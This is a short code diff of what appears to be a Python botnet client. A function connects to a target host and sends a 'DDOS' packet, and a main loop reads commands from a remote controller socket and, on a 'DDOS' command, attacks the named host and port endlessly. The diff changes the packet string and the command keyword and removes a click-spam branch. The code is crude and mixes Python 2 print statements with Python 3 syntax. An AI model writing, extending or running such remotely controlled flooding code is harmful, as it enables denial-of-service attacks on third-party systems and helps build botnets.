@@ -16,7 +16,7 @@ def attack(host="",port=80):
             print"Unresolved hostname."
             sys.exit()
         else:
-            packet = str('DDOS!').encode('utf-8')
+            packet = str('DDOS').encode('utf-8')
             if sock.connect_ex((host,port)) == 0:
                 if sock.sendall(packet) == None:
                     #print"Packet sent successfully!"
@@ -40,7 +40,7 @@ if __name__ == "__main__":
 		cmd = s.recv(1024)
 		print(cmd)
 		cmd_type= cmd.split()
-		if(cmd_type[1]=='ddos'):
+		if(cmd_type[1]=='DDOS'):
 			print('DDos functionality')
 			target_host, target_port = cmd_type[2:]
 			target_port = int(target_port)
@@ -49,8 +49,6 @@ if __name__ == "__main__":
 			s.close()
 			while True:
 				attack(target_host, target_port)
-		if(cmd_type[2]=='click'):
-			print('Click spam')
 
 
 
